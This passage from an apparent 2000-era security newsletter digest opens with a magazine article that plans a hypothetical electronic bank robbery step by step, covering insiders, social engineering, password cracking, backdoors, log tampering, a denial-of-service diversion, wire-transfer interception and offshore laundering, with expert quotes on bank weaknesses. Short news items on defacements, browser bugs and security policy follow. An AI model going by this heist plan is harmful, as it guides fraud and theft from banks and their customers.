      Next, we'll pick our target, avoiding top-tier banks because they're too well protected. We don't want small community or Internet-only banks, either, because their limited money supply makes it likely that managers would instantly notice millions of dollars flying out the electronic doors. So we target a nice midsize bank.[5] 
      
      Finally, like any other business endeavor, we'll need time to get set up and some seed money-for equipment, living expenses, advances, bribes, and so on.[6] Two million dollars should do it.[7] Our goal will be to steal between $10 million and $100 million.[8] 
      
      STEP TWO: THE GROUNDWORK 
      
      Our physical-security pro and his or her associates will get themselves hired by the target bank as janitors, electricians, plumbers, or other contractors.[9] Once inside, they'll plant bugs throughout the bank. They'll also filch useful hard-copy information from desks, filing cabinets, and closets. At the same time, our social engineer and hired cohorts will run a number of small scams designed to yield insights into how the bank sets up, accesses, modifies, and pays out its accounts. For instance, they'll pose as retail and commercial customers, making friends with bank employees outside of work, and impersonating bank employees over the phone in an effort to get information from employees, customers, software vendors, computer professionals, and other banks. Meanwhile, of course, our main insider will be learning everything he or she can about the bank's network, software, processes, and employees. 
      
      The actual hacking will be cautious and low-level for the first several weeks[10]-better to peel an onion than boldly drill for oil. We won't go near the money systems at this point. Instead, we'll focus on finding various ways to get onto the network from the outside.[11] One approach will be "war-dialing," which involves setting up a computer to automatically dial every phone line in the bank[12] in search of an answering modem.[13] Another approach is to set up an online account with the bank, then jump from the online banking server to the bank's main network.[14] Yet another avenue is provided by bank managers who take laptops home and hook up to their banks via cable Internet services (particularly easy to penetrate).[15] If the bank has overseas branches, we may decide to come in through one of them because computer security tends to be more lax offshore. 
      
      Whatever route we take, we won't be able to get in without employee passwords, preferably several-to avoid raising suspicion by running up one person's computer time. But there are lots of ways of getting them. Our inside people should be able to spot some scribbled down on desktops; our social engineers will talk employees and the IT department out of others; we'll run widely available freeware automated password-guessing programs such as Crack; we'll steal them from employees' accounts at e-commerce sites like Amazon.com, because people tend to use the same passwords in different applications; and in many cases we'll be able to quickly guess them off the tops of our heads because people often use passwords such as their last names, "hello," or "password." 
      
      Once on the network, we'll search for ways to jump into different computers and software programs. We may need new passwords at each step-no big deal. At this point, we'll log on only for short periods and avoid touching sensitive systems, to keep from attracting attention. We'll also have our social engineers open several dozen accounts of various types at the bank under false identities. They'll keep mostly modest but occasionally large sums of money flowing into, out of, and among them. 
      
      STEP THREE: THE CODE WORK 
      
      Once we get a feeling for the network, we'll start to obtain "root access" on some of the servers. That is, to get a server to give us all the rights and privileges normally afforded only to the server's systems administrator, or sysadmin. All it takes is the right password.[16] With root access, we can start rolling out the hacker heavy artillery. We'll create new computer accounts, install back doors and Trojan horses,[17] and set up "sniffers" to monitor traffic and break into email archives. In this way, we'll learn the formats and codes that the bank uses to move money around. We'll also break into files storing hundreds of passwords, which will come in handy. And we'll run remote network analyzers-freely available programs such as Satan, Saint, and Sara-that relentlessly probe a network looking for security weaknesses. At this point, we'll now be able to cover our tracks by altering the computer logs that keep track of who accesses what on the network, so we can stay on for longer periods and penetrate more deeply.[18] 
      
      On another front, we'll try getting our hands on a copy of the application software that the bank uses to manage money and accounts because we'd like to figure out a way to secretly modify it to our benefit. The version the bank is running won't do us any good because working software, or "machine code," is nothing but an unintelligible string of 1s and 0s. We'll need the "source code"-the version written in a standard programming language. Software companies guard source code jealously, but we might be able to hack a copy from the vendor.[19] Alternatively, if we're lucky, the bank may have modified the software on its own, in which case it will have a copy somewhere. If we can't find it on the network, we may be able to get it by bribing or extorting one of the bank's IT consultants.[20] Or we might have better luck lifting a copy from an overseas bank or vendor that modified the software to suit local requirements.[21] If we can get the program, we'll look for ways to usefully alter one of its components, then we'll "compile it"-convert it to machine code ready for running. Later, we'll hack into the system and swap our modified component for the real thing.[22] 
      
      Either way, eventually we will learn how to move money internally among accounts-essentially the level of control of a teller-and how to control wire transfers, in which money is transferred to another bank.[23] We'll know what sorts of checks and verifications are run on every transaction of a given type and size, when audits take place, and what sorts of actions cause the computer systems to alert sysadmins or other managers.[24] But we still won't take any money. 
      
      While we're getting to know how the bank's systems operate, we'll also be gathering the latest in nuisance hackerware-viruses, autospammers, and other goodies designed for "denial of service" attacks-that is, attacks intended to bring a system to its knees without necessarily taking anything (the kind of attacks leveled recently at e-commerce sites like Amazon).[25] We'll put these tools into position, but we won't activate anything yet. 
      
      Finally, we'll set up numbered bank accounts in Jamaica, Cyprus, and several other countries that provide maximum banking privacy and minimal cooperation with international law enforcement agencies. We'll also set up accounts at several other U.S. banks, with detailed instructions for quickly moving money in and out of each of these banks.[26] 
      
      STEP FOUR: THE HEIST 
      
      We'll wait for one of the eight or so annual periods of unusually high banking activity to strike.[27] Initially, we activate the computer viruses and the other denial-of-service attacks. This is the civilian equivalent of throwing smoke grenades. We may add some physical shenanigans as well, including bomb threats, plumbing mishaps, electrical failures, and the like. As a result, the bank's IT staff will be bouncing off the walls trying to keep the systems up and running. Of course, the bank could bite the bullet and avoid really serious damage by simply closing down until things are back under control. But it won't; banks are terrified of being seen as anything less than completely reliable.[28] 
      
      All this mischief, of course, will simply be a diversion. 
      
      The main assault will be on two fronts. First, we'll transfer money from thousands of accounts into the ones we opened for ourselves. We'll do this either by becoming a sort of secret superteller on the system or by triggering embedded commands in the hacked version of the account management software, or both. We'll take only a modest amount from any one account-just under the amount that the bank has set as a threshold for triggering extra scrutiny, which might be $1,000 or 3% of the total in the account, whichever is greater. As far as the bank's systems are concerned, this activity will appear as the processing of checks written on one of the bank's accounts, payable to another of its accounts. At this time of year, the extra volume in the check-processing avalanche won't be much more than a small lump. To be sure, even a small lump would normally attract attention, but at this particular moment, bank managers and technicians have too many other things on their minds. As the money accumulates in our accounts, we will start wiring it out, a few thousand dollars at a time (again to avoid tripping alarms or requiring bank manager approval), to our various outside accounts. 
      
      The second front of the attack will involve wire transfer intercepts-that is, hijacking large sums of money that are being wired by legitimate customers to accounts at other banks. It would be extremely difficult to create a fake wire transfer of any significant size because large transfers (more than, say, $10,000) require physical approval from at least two managers. We also couldn't pirate transfers en route between banks because they're encrypted. So we'll grab the transfer after it has been approved but before it's encrypted, using what is known as a "man-in-the-middle" attack.[29] When the approved wire transfer information is supposed to be on its way via the bank's internal network to the computer that will encrypt it, it will in fact be on its way to a server we control, where the information will be modified to make one of our own accounts the recipient. That done, the data will be sent on to the encrypting machine, looking for all the world as if it had come straight from the first machine. 
      
      The money that we're wiring to ourselves through both attacks over a period of perhaps a few hours will be scattered among several U.S. banks, but we'll immediately issue prepared instructions that will consolidate the deposits in the first of our offshore banks, where directions will be instantly provided for rewiring to a second, a third, and so forth, until we finally withdraw the money as cash from the last bank.[30] 
      
      Then we get lost-very comfortably lost [31]-until we're ready to do it all over again.[32] 
      
      THE FINER POINTS 
      
      [1] Of eight respected computer security experts consulted for this article, all agreed that hacking into a bank was doable, and most insisted it wouldn't be all that hard. "If I were going into e-crime, I'd hit a bank," says Jon David, a security guru who has worked in the field for 30 years. Why haven't banks been hacked, then? Oh, but they have--big time. In 1994, a 24-year-old programmer in St. Petersburg, Russia, named Vladimir Levin hacked Citibank for $10 million. He was later caught, extradited to the United States and is serving a three-year sentence. (All but $400,000 of the money was recovered.) This sort of thing happens often but is hushed up, according to Michael Higgins, a former analyst with the Defense Intelligence Agency and now a financial computer security consultant who heads Para-Protect in Alexandria, Virginia. The federal government requires banks to report losses, but Higgins says banks avoid potentially bad publicity by reporting losses as accounting efficiency errors. "The losses are in the reports, but the FBI doesn't get them. They only get reports of alleged crimes," he says. "The reports aren't specific enough to identify losses that could have come from hacking." In the case of larger losses, bank managers simply disregard the law for fear that customers would flee if the truth were known, according to Bob Friel, a former Secret Service agent who now heads a computer forensics group at the Veterans Affairs Inspector General's office. During a stint as a security consultant to banks and other organizations, Friel was shocked to discover the magnitude of the hacker losses that banks were swallowing. He claims his sources in the financial industry report individual hits as large as $100 million. A half dozen banks contacted for this article declined to comment. 
      
      [2] Computer security insiders are usually careful to use the term cracker for someone who tries to gain unauthorized entry into a computer system, reserving hacker as a complimentary term for someone adept at programming. But we'll stick with the popular usage of hacker as an intruder. 
      
      [3] As with many high tech ventures in today's robust economy, finding good people will be our biggest challenge. Programmers with malicious or criminal bents tend not to be the exceptionally talented; most of those make pretty good money in legitimate jobs. If the bloom fades on the tech stock market, however, there could be a lot of high-living programmers who suddenly don't have jobs. In the meantime, we could use "false flag recruitment" techniques, convincing candidates that they would be serving a bank. 
      
      [4] Though our heist will be electronic, it would probably be close to impossible to pull it off without someone providing information from the inside. Levin had an inside partner on the Citibank job. 
      
      [5] Preferably we target a midsize bank that has moved aggressively into information technology and Internet banking, because competitive pressure from technology-savvy big banks has probably caused them to get in over their heads, opening up security gaps. Says Higgins: "Those banks are rushing into technology, and they don't comprehend it completely." 
      
      [6] According to Jim Settle, founder of the FBI's original computer crime squad and now CEO of security consultancy SST, a successful electronic bank heist should take about six months. 
      
      [7] To get our seed money, we can form a private syndicate of the sort that has cropped up to support computer credit card fraud operations in Russia. You'd think we'd be able to work with organized crime, but for now these people "are way behind the curve, for reasons nobody understands," says Settle. In any case, a syndicate or crime boss is going to want a near-guaranteed ROI. If we can't be convincing in that regard, and we lack even the tiniest shred of ethics or patriotism, we can always approach a hostile foreign government--Iraq, North Korea, Russia, and so forth--or even a terrorist organization. Saudi terrorist Usama bin Laden would probably be an eager backer, according to Kawika Daguio, a security expert who heads the bank-supported Financial Information Protection Association, because bin Laden has publicly declared his interest in disrupting U.S. financial institutions. Besides providing ready cash, these sorts of backers won't be on our case about ROI, says Daguio, because "the theft of money could trigger a crisis of confidence, and it doesn't have to be a huge amount." 
      
      [8] We should be able at least to match Levin's initial haul from Citibank, but we could expect to steal as much as $1 billion because of lax standards over the past few years, Friel says. 
      
      [9] Most midsize banks don't bother to do more than the most cursory of background checks of blue-collar employees and contractors. 
      
      [10] This is the opposite of what David Remnitz, CEO of New York information security consultancy IFsec, calls the "Catherine Zeta-Jones" approach--a big-bang, instant hack of the sort popularized by Hollywood and the New York Times that bears little resemblance to the sort of hacking that organizations really need to fear. 
      
      [11] Virtually all banks, and most midsize and large companies, have by now installed a combination of hardware and software firewalls that sit between the outside world and the main gateway to the internal network. Some firewalls are harder to defeat than others, but we won't really care because we won't want to go through the network's main gateway anyway. Hackers usually look for the digital equivalent of rickety back doors and unlocked or easily breakable windows. By the way, larger banks and other businesses sometimes spend as much as millions of dollars apiece on automated "intrusion detection" software. But Settle points out that his company is often hired by companies to try to break into their networks, and in 40 break-ins his team's incursion has been detected only once. 
      
      [12] We can narrow down the list of numbers to dial by looking at the bank's published phone numbers, and our inside people should be able to help, too. Some banks furnish publicly accessible Web domain-name registries with the phone numbers of their computer systems administrators; it's a good bet that there is a modem with a similar number. 
      
      [13] The less sophisticated large corporation has thousands of modem-equipped computers attached to the corporate network, notes Settle. One device often overlooked: multipurpose printer/fax machines, usually left in auto-answer mode to receive faxes but connected to the network for printing purposes. 
      
      [14] Online banking servers should be "air-gapped" from the bank's main network, meaning that no physical connection should exist between them, foiling hackers. But small and midsize banks rushing into online banking don't always take this basic precaution. Even better, some banks are placing their Internet-based services on servers run by outside Web site-hosting companies--servers that may be shared by other, far less security-intensive Web businesses. We could break into one of these other sites, take control of the server, and then jump into the bank's main network. This is an example of the "weakest-link" approach to hacking, notes Higgins. 
      
      [15] Cable companies that provide home Internet access treat entire neighborhoods like one local-area network, points out security expert David, so a hacker can often gain full access to a PC in one home through a PC in a nearby home or a neighborhood cable switch. 
      
      [16] As it turns out, obtaining or guessing root-access passwords isn't necessarily any harder than getting ordinary passwords. For one thing, sysadmins tend to suffer from simultaneous inferiority and superiority complexes, often leading them to favor irreverent, self-aggrandizing, and entirely predictable passwords such as "god" and "bigkahuna." Even better, servers are often shipped from the factory loaded with supposedly default "backdoor" passwords meant for use by vendor technicians; these are sometimes known to the hacker community. 
      
      [17] A Trojan horse is a class of program, freely available on the Internet, that serves a function useful to a hacker but is disguised to look exactly like one of Unix's or Windows' legitimate components. 
      
      [18] Does it seem hard to believe that computer security professionals haven't wised up to these tricks and tools and set up effective defenses? In fact, top security professionals, like the ones interviewed for this article, always make sure such safeguards are installed in systems they are charged with protecting. Fortunately for us, there are barely enough top-notch people in this field to serve large companies; smaller banks and other businesses have to make do with lesser lights. But even the most experienced pros admit that their safeguards can be rendered ineffective by the new security vulnerabilities constantly being identified by hackers and passed around--often well before the typical IT security professional learns of them. Part of the problem is that software vendors are loath to admit to and publicize weaknesses. Says David: "Hackers share vulnerabilities very quickly and efficiently. The vendors often deny that they even exist." There's no shortage of these vulnerabilities: A new security flaw in Windows NT alone is discovered by security professionals on average every three days, says Bruce Schneier, a well-known expert on data encryption and founder of computer security firm Counterpane Internet Security in San Jose, California. Higgins says 32 new flaws were uncovered in Windows NT just in December. No one, of course, knows how many additional flaws hackers are turning up. "Some of these types of flaws have been known for 30 years, and they still haven't been fixed," Schneier says. 
      
      [19] In the book At Large, Charles C. Mann and I describe how a learning-impaired teenager with few computer skills managed, among other sobering feats, to hack from Sun Microsystems a copy of the source code for Solaris--one of the most widely used Internet server software systems in the world. 
      
      [20] According to Friel, midsize banks tend to be overly dependent on consultants and rarely spend the necessary resources on developing their own subject-matter experts. In particular, the consultant feeding frenzy fueled by Y2K anxiety provided a perfect opportunity for outsiders to secretly compromise bank and other software. 
      
      [21] In 1998, an employee of Russia's largest savings bank was caught after having doctored the bank's software to siphon money into his account. 
      
      [22] If for some reason we have trouble enacting the swap, we might have more luck getting our hands on and modifying backup versions of the software, which, notes Schneier, are typically stored in less well-protected facilities. Then all we'll have to do is shut down the working version--the easiest kind of hack--forcing the bank to fire up the secretly modified version. This approach exploits the common vulnerability known as "default to insecure," as when a store can't get through to the network to verify your credit card and approves the purchase rather than lose business. 
      
      [23] Wire transfers are encrypted--that is, scrambled into unintelligible text--and it's not likely we'll break the encryption. Not that it's impossible. In fact, there is a long, rich history of supposedly impervious encryption schemes being broken. Just ask cell phone manufacturers, media companies whose works are distributed on DVD, and any company that has relied on the well-known DES encryption scheme--formerly the standard for banks and now considered crackable with an inexpensive, custom-built computer. Any bank with enough money to make it worth hitting currently employs the vastly more secure "Triple DES" scheme, which would require "alien technology" to break, according to Schneier. Fortunately, we don't need to break it. We might be able to find a bank employee's "pass phrase"--essentially a long password that unscrambles the information--on his or her PC, or lying around a desk. Even easier, we can hack the wire transfer information before it's encrypted. 
      
      [24] In England, for example, a teller discovered that change-of-address procedures for account holders were not audited by her bank--after all, what's so worrisome about a change of address?--so she simply changed the addresses of various account holders to that of her own when checks were due to be sent out, then changed them back. She operated this scam for 10 years before being caught. 
      
      [25] A recent particularly nasty example of nuisance hackware is "extended Trinu," a program that dispatches tens of thousands of "slave" programs throughout the Internet to hide out. When the hacker triggers the "master" program, it in turn sends out commands that activate all the slaves to start sending out streams of system-crippling bogus data via the Internet. "You can defend against 1 or 2 of these attacks," says David, "but not 10 or 20, let alone 10,000." By the way, one of the best-known denial-of-service attacks was carried out on a highly regarded national business magazine by a disgruntled former employee who remotely erased massive amounts of irrecoverable data on the magazine's servers. 
      
      [26] Stealing the money won't be the hard part; getting away with it will be. Schneier says Levin did a good job of hacking but was caught because of amateurish laundering. As Daguio points out, U.S. banks have a history of sparing no expense or effort to track down anyone who steals from them, going all the way back to the posses and bounties of the stagecoach era. 
      
      [27] According to Richard Cromwell, a former Goldman Sachs VP now with security consultancy IFsec, the end of the year is a particularly good time to pull the trigger because of the vast rivers of money moving through the holiday-shopping-fueled economy and the increase in staff absences. 
      
      [28] Friel estimates that a systems shutdown would cost a large business, such as eBay or Amazon.com, $1 million per hour in hard losses. "But the bad PR would cost 10 times that much," he adds. 
      
      [29] This is one example of a broader class of attack known as "spoofing," in which commands from an outside computer are disguised to make them look as if they are coming from another, friendlier computer. 
      
      [30] Eventually, each one of these banks will almost certainly report us to the authorities, under pressure from their own governments, which will be facing the threat of international sanctions. But if we push the money through enough of these banks, by the time the last bank is coerced, we'll long since have cashed out. 
      
      [31] The only risk of immediate physical apprehension will be borne by our insiders at the bank. Sad to say, they may have been expendable to begin with, especially if we obtained their services through extortion. But there is a good chance they will have been able to skip town ahead of the attack, too, having already provided all the needed information. Even if they are sitting right there, perhaps providing approval of the wire transfers, the final attack will be so buried in a sea of activity that it will probably be hours, if not a day or more, before the money is discovered missing--plenty of time to simply walk out and get to the airport. 
      
      [32] If--or, let's face it, when--a few banks are publicly cyberlooted, most might raise the security bar to the point where it simply doesn't make sense to go after them. At least not when there are so many other, far less well-protected businesses to pillage, offering expensive goods, engineering data, credit card numbers, payments for fictitious services, and more. Fortunately for us of the high tech criminal element, only a small percentage of companies make computer security a high priority, and there is little pressure from the marketplace on Microsoft, Sun Microsystems, and other major software vendors to stop turning out code that is rife with security flaws. So barring some sort of stunning wake-up call to corporate America, we should be able to keep on hacking profitably for years to come.

283.0 [ISN] Spain hackers sabotage museum site
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
      http://www.lasvegassun.com/sunbin/stories/tech/2000/apr/17/041700923.html
      
      MADRID, Spain (AP) [4.17.2000] - Computer hackers supporting the armed
      Basque separatist group ETA sabotaged the Web page of the Guggenheim
      Museum in the Basque city of Bilbao over the weekend, a museum
      official said Monday.
      
      The culprits tampered with the site Sunday so that it showed slogans
      praising ETA and its goal of independence for the Basque country, an
      area straddling the border between northern Spain and southwest
      France, said spokeswoman Neria Abasolo.
      
      The site was disrupted for a few hours, she added. Photographs of
      imprisoned ETA members accompanied statements written in English
      calling France and Spain oppressors.
      
      ETA is blamed for the deaths of nearly 800 people in its more than
      30-year struggle for independence.
      
      The group called a cease-fire in Sept. 1998, raising hopes for an end
      to the conflict, but ended the truce in January of this year,
      expressing frustration with the pace of the peace process.
      
      The group has claimed responsibility for two car bombings this year
      which killed three people, and been blamed for another that injured
      seven.

284.0 [ISN] Hackers: Cyber saviours or snake-oil salesmen?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.theregister.co.uk/000417-000007.html
      
      Posted 17/04/2000 2:15pm by Kieren McCarthy
      
      Surrounded by sycophantic applause and loud guffaws at weak jokes, a
      strange, nervous twitch started to develop. Similar to entering the
      Blue Oyster bar *, the Hackers Forum was not the kind of place an
      old-style, cynical hack is welcome.
      
      Up on stage at London's Olympia is "one of the strongest line-ups of
      hacking experts ever assembled in the UK". In the audience, a mixture
      of geeks, hacker wannabes and security firm employees.
      
      Hackers have moved from being cyber-terrorists and malicious intruders
      to modern saviours, knights of the e-table. As long as he doesn't
      approve of the actual attacks, a hacker is a cult hero. Hackers are
      the little men fighting back, two fingers up to multi-national
      corporations - vive la revolution!
      
      And being British, we buy into this underdog culture. They're raising
      the security barrier, showing how huge firms just throw money at the
      net without understanding it, they bring down porn sites when the
      authorities are helpless to intervene. As one speaker quips: "We
      should be making 'Thank a hacker' bumper stickers" (much laughter).
      
      We're all very cosy. Typical "questions" are: "I'd just like to say
      that I think your program is amazing"; "Why don't people understand
      what you're trying to do?". All that's missing is some US-style
      whooping. When someone interrupted the party to ask how they justify
      their hacking software - free and used by hundreds of bored teenagers
      everywhere - he is arrogantly interrupted: "They're called 'script
      kiddies'."
      
      "I don't give a 4xxx what you call them, I want to know how you
      justify your actions" - that, at least, was what he wanted to say but
      he'd never have made it out of the door alive.
      
      The reality is, no matter what they say, media-friendly hackers and
      those evil-nasty hackers wot do the damage are the same breed. They
      learn the same skills in the same places, even if they are not driven
      by exactly the same passions. That one goes in front of an audience
      and says it is for the hacked company's own benefit is irrelevant.
      
      In its way, hacking is the equivalent of graffiti artists in the 80s.
      At first, graffiti was a manifestation of bored youth, then a cult
      activity. Condemned, it reached the media, which then turned such
      artists into celebrities and sparked off a million other graffiti
      sprayers. It became an art form and virtual social acceptance was
      assured.
      
      This is where we are with hacking. With any luck, it will go the same
      way as graffiti - the main players will fade, its impact will be put
      into perspective and it will become nothing more than an irritation.
      
      That said, it was difficult to hide a smirk when the workings of two
      of the latest and greatest pieces of anti-hacking software (as
      explained to The Reg by the companies' VPs at a trade show) were torn
      to pieces by a hacker - within seconds.
      
      * Blue Oyster bar - Leather-based gay bar from the Police Academy
      series. A running gag was that people would enter a non-descript
      backdoor to hide and then find themselves among a mass of gay bikers
      who proceeded to dance the Tango with them.

285.0 [ISN] U.S to beef up Cyber Defenses
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.wired.com/news/politics/0,1283,35742,00.html
      
      WASHINGTON [4.18.2000] - Treasury Secretary Lawrence Summers warned
      corporate chiefs Tuesday that protecting their data from cyber threats
      was about to become a top priority in the United States.
      
      He said he had no doubt that in 10 years information security would be
      "an absolutely central priority in terms of management of business
      risk."
      
      "The only question is whether we will move to that in a smooth way or
      whether there will have been four or five spectacular failures which
      will have woken everybody up and gotten us to that point," Summers
      said.
      
      He made his comments at a daylong White House conference aimed at
      spurring corporate attention to, and spending on, the threat of
      computer assaults. Attending the conference, the first in a six-part
      regional series, were experts on corporate governance, auditors, and
      senior executives.
      
      Commerce Secretary William Daley told the session that the Internet
      era marked "the first time in American history the federal government
      alone cannot protect our infrastructure."
      
      "We can't hire a police force big enough to protect all of industry's
      key information assets," he said. "Nor would you want us to."
      
      Instead, the Clinton administration has been pushing industry groups
      to share more data on network vulnerabilities both among themselves
      and with law enforcement and intelligence officials led by the Federal
      Bureau of Investigation. Summers cited the model of a center set up by
      21 U.S. financial services firms last October.
      
      The administration has stepped up its public expressions of concern
      since an assault in February disrupted online access for hours to such
      popular Web sites as Yahoo, Amazon.com, eBay, E-Trade, and others.
      
      Possible threats range from youthful hackers and criminals to
      guerrilla groups. The administration also has frequently cited
      "information warfare" tactics that it says are under study by China,
      Russia, and other countries.
      
      John Podesta, President Clinton's chief of staff, told the conference
      that building safer computer security practices was critical both to
      U.S. business and national security.
      
      "And we are most successful when we work together as partners," he
      said.
      
      Richard Clarke, the White House National Security Council staff
      coordinator for infrastructure protection and counterterrorism, said
      the government was willing to share intelligence on cyber threats with
      industry groups "if we can establish classified" channels for handling
      it.
      
      But he said federal authorities were looking to the private sector to
      come up with information-security standards that might be required,
      for instance, to meet auditing guidelines or to get insurance.
      
      In a report released at the conference, the Institute of Internal
      Auditors, which claims 70,000 members worldwide, said corporate
      directors had a responsibility to practice "due care" in overseeing
      information security practices.
      
      "Any board that fails to address information security does so at the
      peril of the organization and itself," the Altamonte Springs,
      Florida-based professional group said.

      Netscape tests patches for security hole 
      By Paul Festa
      Staff Writer, CNET News.com
      April 21, 2000, 2:00 p.m. PT 
   
      update Netscape is testing patches for a newly discovered security hole in its Communicator Web browser that could expose private files.
   
      The vulnerability lets a hostile Web site glean private information from a visitor, including but not limited to that visitor's bookmarks.
   
                          Netscape and the bug's discoverer agree that the problem isn't with any one aspect of Communicator, but with a combination of technologies that lets a malicious Web operator skirt browser security
                          checks.
   
                          Those security checks normally prevent Web authors using JavaScript from transferring information from a frame with the Web surfer's liberal security clearance to another frame belonging to the hostile Web
                          site.
   
                          JavaScript is a scripting language, designed by Netscape, that is used to prompt actions on a computer without a person's interaction. Frames are smaller windows within windows on Web sites.
   
                          Computer users can use frames or full windows to access local files on their computer, which is why windows opened from the local disk have those liberal security restrictions. Cross-frame security checks
                          are designed to protect those windows from being hijacked by hostile Web sites. 
   
                          But in an exploit demonstrated by bug hunter and anti-content-filtering activist Bennett Haselton, a Web author can insert JavaScript code through a cookie placed on a person's hard drive.
   
                          Cookies are text files that Web sites use to store information about a visitor for future reference. Applications that rely on cookies include Web-based email applications, which use the technology to track
                          how long a visitor has been logged into an account, and shopping carts, which keep track of items a shopper has opted to buy.
   
                          Haselton said the exploit could be used to pilfer both bookmarks and cache information. The cache keeps copies of Web pages so that the browser does not have to make new queries to the same Web
                          address to display repeatedly requested content.
   
      "Getting 'read' access to the user's hard drive is the second-most-powerful exploit you can possibly launch," said Haselton, identifying the ability to execute code on a person's computer as the most powerful. "If I run the exploit on a
      specific person, I can determine what other sites they have visited."
   
      Netscape, a unit of America Online, minimized the importance of the vulnerability, citing the necessary conditions--having the configuration set to "default" and the browser installed in its default location--and the fact that only links,
      such as those found in bookmark files, could be accessed using the exploit.
   
      Netscape also disputed Haselton's claim that the hole exposed a user's cache files.
   
      "To exploit this bug, the hostile Web site must know the name of the targeted HTML file," said Eric Krock, Netscape's group product manager for tools and components. "The names of the files in the cache are encrypted. Therefore,
      files in the cache cannot be accessed."
   
      Netscape further downplayed the seriousness of the hole, pointing out that even vulnerable files were not fully readable through it.
   
      "Even if you know the name of the file, you don't have access to all of its contents," Krock said. "You can't read its text--you can only read JavaScript data, such as links. So the claim that this grants general 'read' access to the user's
      hard drive is false."
   
      Haselton and Netscape both pointed out that the exploit only works if the computer user has his or her profile name set to "default," which Haselton said was true for most people's configurations. Communicator profile names can be
      found at the following path on computers with the Windows operating system: C:\Program Files\Netscape\Users\.
   
      Netscape said it was testing a pair of potential fixes to the problem, which it would add to an upcoming minor point release of Communicator 4.7. Netscape recommended that Web users concerned about the bug either turn off
      JavaScript, refuse to accept cookies, or choose to accept cookies only from trusted sources.

      Microsoft browser bug may access private files 
      By Paul Festa
      Staff Writer, CNET News.com

      Microsoft is looking into a newly discovered security hole in its browser that could expose people's private files to malicious Web site operators. 
   
      The security flaw surfaces as the software giant reels from a series of miscues involving security breaches and software leaks.
   
                          The latest bug has to do with the way Microsoft's Internet Explorer browser handles the Java programming language, according to veteran browser-bug hunter Georgi Guninski.
   
                          The flaw lets a malicious Web site operator use a script to open a new browser window. That window opens with the computer owner's security safeguards.
   
                          Because IE normally lets the local computer user find files on the hard drive as well on the Web, the maliciously scripted window can display any file on a person's computer.
   
                          Scripts are lines of computer code that give browsers instructions to execute actions without a person's interaction. Scripts can open pop-up windows, run tickers across a screen, or double-check
                          information entered in online forms.
   
                          Internet Explorer comes equipped with a security mechanism that should prevent Web authors from using scripts to peek from one window into another with the minimum security safeguard. But Guninski's
                          exploit takes advantage of what he described as flaws in IE's Java implementation to circumvent those mechanisms.
   
                          This isn't the first time Microsoft has grappled with weaknesses in IE's cross-frame security. Microsoft tackled one such problem in January, another in October and a third in September.
   
                          The Achilles' heel of cross-frame security in this case is a combination of Microsoft's Java implementation, the JavaScript scripting language, and the document object model (DOM), a specification for
                          transforming each element of a Web page into an independent object that a script can manipulate.
   
      According to Guninski, IE's Java implementation normally restricts the use of JavaScript URLs so they cannot be used to get around cross-frame security. But IE's Java implementation interacts with the DOM in such a way that
      JavaScript can get away with that trick.
   
      "The Java JSObject allows setting DOM properties from Java and allows setting a hostile JavaScript URL to (a frame's) location," Guninski wrote in a description of the bug posted to the Bugtraq security mailing list. "This leads to
      circumventing cross-frame security policy."
   
      Guninski posted a demonstration of the exploit and recommended disabling Java or disabling scripting of Java applets pending Microsoft's fix.
   
      Microsoft said it was investigating the problem, which it learned of yesterday morning, and declined to comment further on the security hole pending its investigation.

287.0 [ISN] Intel plans to giveaway security software via web

      Intel Plans to Give Away Security Software Via Web
      By DAVID P. HAMILTON
      Staff Reporter of THE WALL STREET JOURNAL
      Monday April 10, 2000
      
      Intel Corp. Monday will announce plans to freely distribute an "open
      source" version of advanced security software, a move designed to
      bolster both its growing support for the free Linux operating system
      and its ambitions to supply crucial "building blocks" for
      Internet-based e-commerce.
      
      The new Intel software implements a set of security functions known as
      the Common Data Security Architecture, an industry-wide security
      standard first established just over two years ago.
      
      CDSA encompasses features such as high-level encryption, used to
      encode e-mail messages and other data in order to ensure privacy, and
      ways of assigning and managing digital certificates, which guarantee
      the identity of users and corporations across the Internet and
      corporate networks.
      
      Such security features are already supported in a piecemeal fashion by
      a variety of major hardware and software companies, who have typically
      written their own programs to implement such functions and then
      integrated them into their server operating systems.
      
      Intel, however, hopes to make CDSA features far more accessible to
      software developers world-wide in the most direct way possible -- by
      giving away its software over the Internet. For the past several
      years, Intel engineers have worked on a "reference implementation" of
      CDSA functions, an effort to build working CDSA software that Intel
      estimates cost more than $20 million. Monday, Intel plans to announce
      that it will begin offering that software -- and its underlying
      program code -- for download by May 15.
      
      By offering the security software to the world for free, Intel hopes
      to make it far easier for software developers to use security
      functions on a variety of computer hardware and operating systems.
      Since e-commerce depends heavily on the ability to both protect
      transactions and sensitive information from interception, "this kind
      of cross-platform security infrastructure is a vital enabler to make
      e-business a reality," says Terry Smith, an Intel marketing manager
      for the CDSA initiative.
      
      In addition, many security experts argue that open-source security
      programs tend to offer better protection than programs developed by a
      single company, since their inner workings are open to scrutiny,
      criticism and improvement. U.S. export controls, which for years have
      hampered the international sale of many security programs, now exempt
      open-source programs as well.
      
      Intel, of course, stands to benefit from anything that makes
      encryption and other computation-intensive security technology more
      widespread, since such activities tend to drive demand for Intel's
      high-end microprocessors.  Indeed, the first CDSA programs it plans to
      release on May 15 will run on Linux-and will be optimized to run on
      Intel processors.
      
      The Intel effort also reflects its growing support for Linux and an
      increasing divergence in its longtime partnership with Microsoft,
      which also offers encryption and similar security functions-but only
      used with its Windows operating system.
      
      Separately, Intel said it plans to make a multimillion-dollar
      investment in e-business centers in Europe to provide facilities and
      resources for creating and validating e-business applications running
      on Intel architecture. The exact amount of the investment wasn't
      disclosed.
      
      The company said the first centers, in Stockholm, Munich, and Reading,
      United Kingdom, will open during the next six months. The company
      plans additional centers in Amsterdam and Paris. Clients will be able
      to use the centers to experiment with e-business applications before
      launching them in the market.
      
      So far, Agency.com Ltd. and IXL Enterprises Inc., Icon Medialab AB
      Europe unit, DDB Interactive and Matra Grolier Network, France, have
      joined the program, among others.

288.0 [ISN] Companies boosting security for web sites
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.phillynews.com/inquirer/2000/Apr/19/business/HACKER19.htm
      
      Recent attacks by hackers raised concerns about protecting e-commerce
      and information technology.
      
      The Philadelphia Inquirer, April 19, 2000
      By Katherine M. Reynolds
